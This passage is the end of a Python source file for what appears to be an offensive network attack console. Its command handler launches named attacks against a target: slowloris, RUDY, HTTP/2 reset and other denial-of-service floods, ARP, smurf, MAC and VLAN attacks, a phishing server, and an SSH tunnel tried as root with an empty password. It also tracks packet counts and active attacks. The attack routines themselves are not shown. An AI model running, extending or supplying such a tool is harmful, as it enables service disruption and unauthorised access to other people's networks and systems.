                            elif atype == "wirehand":
                                await method(duration=duration)
                            elif atype in ("autoesc", "traffic", "bandwidth", "conns", "chaos"):
                                await method(target, duration=duration) if atype != "conns" else await method()
                            elif atype in ("arp", "smurf", "mac"):
                                await method(target, duration=duration, pps=pps)
                            elif atype == "vlan":
                                await method(target, duration=duration, pps=pps)
                            elif atype in ("slowloris", "http", "rudy", "slowread", "http2reset", "ws"):
                                await method(target, port=port, duration=duration)
                            elif atype == "phish":
                                await method(port=port, duration=duration)
                            elif atype == "sshtun":
                                await method(target, username="root", password="", duration=duration)
                            elif atype in no_port_types:
                                await method(target, duration=duration, pps=pps)
                            else:
                                await method(target, port, duration, pps)
                            output = f"[green]Attack '{atype}' launched on {target}[/]"
                        except Exception as e:
                            output = f"[red]Attack failed: {e}[/]"
            elif command == "list":
                active = self.registry.active()
                output = (
                    f"[yellow]Active: {', '.join(active)}[/]"
                    if active
                    else "[dim]No active attacks[/]"
                )
            elif command == "stop":
                self.engine.stop()
                output = "[red]All attacks stopped[/]"
            elif command == "status":
                pkts   = self.registry.total_packets()
                active = self.registry.active()
                output = (
                    f"Packets: {pkts:,}   "
                    f"Active: {len(active)}   "
                    f"IP: {self.net.ip or 'N/A'}"
                )
            elif command == "report":
                self.mode = "report"
                output = "Switched to Report view"
            elif command == "menu":
                self.mode = "menu"
                output = "Back to main menu"
            else:
                output = f"[red]Unknown command: {command}  —  type 'help' for reference[/]"
        except Exception as e:
            output = f"[red]Error: {e}[/]"

        self.cmd_output = output
# ──────────────────────────────────────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────────────────────────────────────
async def main():
    config = Config()
    net = NetworkContext()
    registry = AttackRegistry()
    log = LogBus()
    engine = AttackEngine(config, registry, log, net)
    ui = UI(config, net, registry, log, engine)
    try:
        await ui.run()
    except KeyboardInterrupt:
        console.print("\n[yellow]Interrupted[/]")
    finally:
        engine.stop()
        if ui._stdin_reader:
            ui._stdin_reader.cancel()
        console.print("[green]Goodbye.[/]")

if __name__ == "__main__":
    if _UVLOOP:
        uvloop.install()
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass